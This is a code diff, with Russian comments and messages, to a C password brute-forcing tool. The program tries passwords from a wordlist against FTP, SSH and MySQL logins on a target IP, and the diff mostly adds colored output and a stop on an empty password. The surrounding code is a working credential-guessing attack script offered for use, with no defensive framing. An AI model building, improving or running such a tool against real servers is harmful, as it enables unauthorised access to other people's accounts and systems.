@@ -11,6 +11,7 @@
 
 // ANSI escape codes for colored output
 #define GREEN "\033[0;32m"
+#define RED "\033[0;31m"
 #define RESET "\033[0m"
 
 // Функции для брутфорса по протоколам
@@ -26,7 +27,7 @@ void brute_force(const char *protocol, const char *ip, const char *username, con
     } else if (strcmp(protocol, "mysql") == 0) {
         brute_force_mysql(ip, username, password);
     } else {
-        printf("Неизвестный протокол: %s\n", protocol);
+        printf(RED "Неизвестный протокол: %s\n" RESET, protocol);
     }
 }
 
@@ -62,7 +63,7 @@ void brute_force_ftp(const char *ip, const char *username, const char *password)
     if (strstr(buffer, "230") != NULL) {
         printf(GREEN "Успешный вход с паролем: %s\n" RESET, password);
     } else {
-        printf("Неверный пароль: %s\n", password);
+        printf(RED "Неверный пароль: %s\n" RESET, password);
     }
 
     close(sock);
@@ -95,7 +96,7 @@ void brute_force_ssh(const char *ip, const char *username, const char *password)
     if (libssh2_userauth_password(session, username, password) == 0) {
         printf(GREEN "Успешный вход с паролем: %s\n" RESET, password);
     } else {
-        printf("Неверный пароль: %s\n", password);
+        printf(RED "Неверный пароль: %s\n" RESET, password);
     }
 
     libssh2_session_disconnect(session, "Normal Shutdown");
@@ -109,7 +110,7 @@ void brute_force_mysql(const char *ip, const char *username, const char *passwor
     if (mysql_real_connect(conn, ip, username, password, NULL, 0, NULL, 0)) {
         printf(GREEN "Успешный вход с паролем: %s\n" RESET, password);
     } else {
-        printf("Неверный пароль: %s\n", password);
+        printf(RED "Неверный пароль: %s\n" RESET, password);
     }
     mysql_close(conn);
 }
@@ -135,7 +136,14 @@ int main() {
     }
 
     while (fgets(password, MAX_PASSWORD_LENGTH, file) != NULL) {
-        password[strcspn(password, "\n")] = 0;
+        password[strcspn(password, "\n")] = 0; // Удаляем символ новой строки
+
+        // Проверка на пустой пароль
+        if (strlen(password) == 0) {
+            printf(RED "Ввод пустого пароля. Остановка программы.\n" RESET);
+            break; // Останавливаем выполнение программы
+        }
+
         printf("Пробуем пароль: %s\n", password);
         brute_force(protocol, ip, username, password);
         sleep(1); // Задержка в 1 секунду
